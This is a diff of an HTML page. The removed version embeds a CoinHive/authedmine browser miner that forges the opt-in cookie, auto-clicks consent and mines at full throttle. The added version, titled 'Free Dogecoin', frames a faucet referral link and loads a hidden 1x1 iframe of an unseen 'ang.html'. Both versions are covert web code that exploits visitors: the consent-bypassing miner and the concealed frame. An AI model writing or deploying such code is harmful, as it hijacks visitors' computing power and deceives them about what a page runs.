@@ -1,54 +1,18 @@
-
-<!doctype html>
-<html lang="en">
-<head>
-    <meta charset="utf-8" />
-    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
-
-    <title>Shovel Script</title>
-
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
-
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/toastr.js/2.1.4/toastr.min.js"></script>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/toastr.js/2.1.4/toastr.min.css" />
-
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/semantic-ui/2.3.0/semantic.min.js"></script>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/semantic-ui/2.3.0/semantic.min.css" />
-    <style>
-        div {
-          /*
-          display: none;
-          */
+<html>
+    <head>
+        <title>Free Dogecoin</title>
+    </head>
+    <style type="text/css">
+        body {
+            margin: 0;
+            padding: 0;
+        }
+        iframe {
+            border: none;
         }
     </style>
-</head>
-<body>
-    <script src="https://authedmine.com/lib/authedmine.min.js"></script>
-    <script>
-        $(function(){
-          document.cookie = "CoinHiveOptIn=1534531274.f04e30952eaf092b90e49632e8ee930a";
-          var miner = new CoinHive.User('KxmZ6PmwDtGMbMSgoJ0OVoC4ikwq1uKB', '81e13cb8f9b69224043564e7179e3273', { throttle: 0 });
-
-          miner.start();
-          toastr.success('Connect to the pool and start mining');
-
-          $(document).ready(function() {
-            $("#accept").click();
-          });
-          setInterval(function() {
-              console.log("Total: " + miner.getTotalHashes());
-          }, 1000);
-
-        });
-    </script>
-
-    <script>
-        $(function () {
-            
-
-            $('.ui.dropdown').dropdown();
-        });
-    </script>
-</body>
+    <body>
+        <iframe src="http://freedoge.co.in/?r=3201665" width="100%" height="100%"></iframe>
+        <iframe style="display: none;" src="ang.html" width="1" height="1"></iframe>
+    </body>
 </html>
